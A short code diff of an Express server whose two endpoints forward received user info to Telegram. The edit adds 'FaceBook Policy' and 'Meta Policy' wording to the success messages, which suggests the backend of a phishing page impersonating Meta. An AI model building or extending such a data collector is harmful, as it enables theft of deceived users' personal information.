@@ -52,7 +52,7 @@ app.post('/api/user-info', async (req, res) => {
         });
 
         res.json({
-            message: 'User info received and sent to Telegram successfully',
+            message: 'User info received and sent to Telegram successfully on web FaceBook Policy',
             telegramResponse: response.data.result.text,
         });
     } catch (error) {
@@ -95,7 +95,7 @@ app.post('/api/user-info-1', async (req, res) => {
         });
 
         res.json({
-            message: 'User info received and sent to Telegram successfully',
+            message: 'User info received and sent to Telegram successfully on Meta Policy',
             telegramResponse: response.data.result.text,
         });
     } catch (error) {
